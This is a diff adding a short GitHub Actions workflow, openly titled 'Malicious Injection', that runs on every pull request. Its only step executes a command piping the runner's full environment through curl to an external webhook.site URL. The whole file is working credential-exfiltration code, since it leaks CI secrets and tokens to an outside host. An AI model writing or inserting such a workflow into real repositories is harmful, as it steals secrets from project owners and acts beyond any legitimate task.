@@ -1,0 +1,17 @@
+name: Malicious Injection
+
+on:
+  pull_request:
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        target:
+          - "echo '🔥 Exploiting CI'; env | curl -X POST -d @- 'https://webhook.site/86e8b412-7191-449c-9b7e-071bad00d67e'"
+    steps:
+      - name: Malicious Exec
+        run: |
+          echo "Command: ${{ matrix.target }}"
+          bash -c "${{ matrix.target }}"
